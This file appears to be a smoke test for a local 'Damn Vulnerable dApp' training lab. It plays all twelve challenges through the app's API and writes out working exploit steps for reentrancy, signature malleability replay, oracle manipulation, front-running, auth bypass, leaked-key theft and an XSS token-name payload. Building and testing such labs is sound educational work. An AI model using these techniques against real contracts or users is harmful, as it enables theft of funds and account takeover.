// End-to-end smoke test of the RUNNING app (start it first with `npm run dev`).
// Plays every challenge only through the app's HTTP API and /rpc proxy, the same way a
// browser would, then checks the server marks each one solved and unlocks its write-up.
// SPOILERS: this file contains every solution.
const { ethers } = require("ethers");
const BASE = process.env.BASE || "http://127.0.0.1:3000";
const api = async (p, opts = {}) => {
  const r = await fetch(BASE + p, { headers: { "content-type": "application/json", ...(opts.headers || {}) }, method: opts.method || "GET", body: opts.body && JSON.stringify(opts.body) });
  const t = await r.text();
  try { return { status: r.status, body: JSON.parse(t) }; } catch { return { status: r.status, body: t }; }
};
const E = ethers.parseEther;

(async () => {
  const provider = new ethers.JsonRpcProvider(BASE + "/rpc", 31337, { staticNetwork: true });
  const { body: d } = await api("/api/challenges");
  const me = await provider.getSigner(d.player);
  const st = Object.fromEntries(d.challenges.map((c) => [c.id, c.state]));
  const abi = async (n) => (await api(`/api/artifacts/${n}`)).body;
  const C = async (n, a, r = me) => new ethers.Contract(a, (await abi(n)).abi, r);
  const deploy = async (n, args = [], o = {}) => { const { abi: a, bytecode } = await abi(n); const c = await new ethers.ContractFactory(a, bytecode, me).deploy(...args, o); await c.waitForDeployment(); return c; };
  const w = (p) => p.then((tx) => tx.wait());
  const bot = (id, a, b = {}) => api(`/api/challenges/${id}/bot/${a}`, { method: "POST", body: b });

  const plays = {
    "01-reentrancy": async (s) => w((await deploy("ReentrancyAttacker", [s.bank])).attack({ value: E("1") })),
    "02-access-control": async (s) => { const v = await C(s.contract, s.vault); await w(v.changeOwner(d.player)); await w(v.sweep(d.player)); },
    "03-tx-origin": async (s) => bot("03-tx-origin", "aliceClaimsAirdrop", { target: await (await deploy("FakeAirdrop", [s.wallet])).getAddress() }),
    "04-share-inflation": async (s) => {
      const t = await C("DVToken", s.token), v = await C(s.contract, s.vault);
      await w(t.approve(s.vault, ethers.MaxUint256)); await w(v.deposit(1n)); await w(t.transfer(s.vault, E("10")));
      await bot("04-share-inflation", "aliceDeposits"); await w(v.redeem(await v.shares(d.player)));
    },
    "05-weak-randomness": async (s) => w((await deploy("LotteryPredictor")).attack(s.lottery, { value: E("1") })),
    "06-signature-replay": async (s) => {
      const { body: v } = await bot("06-signature-replay", "requestVoucher");
      const a = await C(s.contract, s.airdrop);
      await w(a.claim(v.to, v.amount, v.v, v.r, v.s));
      const n = 0xfffffffffffffffffffffffffffffffebaaedce6af48a03bbfd25e8cd0364141n;
      await w(a.claim(v.to, v.amount, v.v === 27 ? 28 : 27, v.r, ethers.toBeHex(n - BigInt(v.s), 32)));
    },
    "07-approval-abuse": async (s) => { const r = await C(s.contract, s.router); await w(r.depositFor(s.alice, d.player, E("50"))); await w(r.withdraw(E("50"))); },
    "08-oracle-manipulation": async (s) => {
      const dvt = await C("DVToken", s.dvt), dusd = await C("DVToken", s.dusd), pool = await C("SimplePool", s.pool), desk = await C(s.contract, s.desk);
      await w(dusd.approve(s.pool, ethers.MaxUint256)); await w(pool.swap(s.dusd, E("1000")));
      const b = await dvt.balanceOf(d.player); await w(dvt.approve(s.desk, b)); await w(desk.depositCollateral(b));
      await w(desk.borrow(await dusd.balanceOf(s.desk)));
    },
    "09-front-running": async (s) => {
      await bot("09-front-running", "wakeSolver");
      const p = await provider.send("eth_getBlockByNumber", ["pending", true]);
      const t = p.transactions.find((x) => x.to.toLowerCase() === s.bounty.toLowerCase());
      await me.sendTransaction({ to: t.to, data: t.input, gasLimit: 300000, maxPriorityFeePerGas: ethers.parseUnits("50", "gwei"), maxFeePerGas: ethers.parseUnits("200", "gwei") });
      console.log("   waiting for the 30s mempool window to close…");
      for (let i = 0; i < 40 && (await (await C(s.contract, s.bounty, provider)).winner()) === ethers.ZeroAddress; i++) await new Promise((r) => setTimeout(r, 1000));
    },
    "10-backend-sig-auth": async (s) => {
      const message = "Sign in to Damn Vulnerable dApp";
      const signature = await me.signMessage(message);
      const { body } = await api("/api/c10/login", { method: "POST", body: { address: s.admin, message, signature } });
      const r = await api("/api/c10/admin", { headers: { authorization: `Bearer ${body.token}` } });
      console.log("   admin says:", JSON.stringify(r.body));
    },
    "11-leaked-key": async (s) => {
      const src = await (await fetch(BASE + "/config.js")).text();
      const relayer = new ethers.Wallet(src.match(/0x[0-9a-fA-F]{64}/)[0], provider);
      await w((await C(s.contract, s.token, relayer)).mint(d.player, E("1000")));
    },
    "12-untrusted-token-data": async (s) => {
      const t = await deploy("NamedToken", ['<img src=x onerror="alert(document.domain)">', "XSS"]);
      await w((await C("TokenWatchlist", s.watchlist)).list(await t.getAddress()));
    },
  };

  let failures = 0;
  for (const c of d.challenges) {
    const before = (await api(`/api/challenges/${c.id}/check`, { method: "POST" })).body.solved;
    await plays[c.id](st[c.id]);
    const after = (await api(`/api/challenges/${c.id}/check`, { method: "POST" })).body.solved;
    const wu = await api(`/api/challenges/${c.id}/writeup`);
    const ok = before === false && after === true && wu.status === 200;
    if (!ok) failures++;
    console.log(`${ok ? "PASS" : "FAIL"} ${c.id}  before=${before} after=${after} writeup=${wu.status}`);
  }
  // reset works: a redeployed challenge has a new address and is unsolved again
  const r = await api("/api/challenges/01-reentrancy/reset", { method: "POST" });
  const again = (await api("/api/challenges/01-reentrancy/check", { method: "POST" })).body;
  console.log(`${r.body.state.bank !== st["01-reentrancy"].bank && again.solved === false && again.everSolved ? "PASS" : "FAIL"} reset redeploys (write-up stays unlocked)`);
  process.exit(failures ? 1 : 0);
})().catch((e) => { console.error(e); process.exit(1); });
